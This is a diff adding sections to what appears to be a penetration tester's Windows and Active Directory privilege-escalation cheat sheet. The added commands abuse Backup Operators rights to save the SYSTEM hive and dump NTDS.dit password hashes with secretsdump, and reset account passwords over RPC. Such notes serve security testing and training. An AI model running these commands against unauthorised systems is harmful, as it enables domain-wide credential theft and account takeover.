@@ -113,6 +113,65 @@ accesschk.exe -uwdqs "Authenticated Users" c:\
 accesschk.exe -uwdqs "Everyone" c:\
 ```
 
+# Privileged Groups
+
+## AD Recycle Bin
+A user in the group is allowed to read / recover deleted AD objects.
+
+```powershell
+Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
+```
+
+## Remote Management Users
+Members of this group can access PCs over **WinRM**
+
+```powershell
+Get-NetGroupMember -Identity "Remote Management Users" -Recurse
+Get-NetLocalGroupMember -ComputerName <pc_name> -GroupName "Remote Management Users"
+```
+
+## AD Backup Operators
+Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files
+
+```powershell
+# Import libraries
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+
+# Enable SeBackupPrivilege
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
+
+[SeBackupPrivilege DLLs](https://github.com/k4sth4/SeBackupPrivilege)
+### Get Hashes from .dit File
+
+```bash
+# LOCAL
+## Download .dit file (assuming evil-winrm is used)
+download <database_file>
+## Get system HIVE
+reg.exe save hklm\system <destination>
+
+# REMOTE (after file downloads)
+secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
+```
+
+
+  
+
+# Interesting Account Names
+
+## AD Support Accounts
+Often we have the credentials belonging to limited administrative accounts such as `IT`, `helpdesk` or `support`.
+Sometimes, these accounts have an ability to reset passwords.
+
+*Note that the wording of the account name might be different, but related to aforementioned names*
+
+[Reset password through RPC](https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html#reset-ad-user-password)
+```bash
+setuserinfo2 <user> 23 <password>
+```
 
 # Directories
 ```powershell
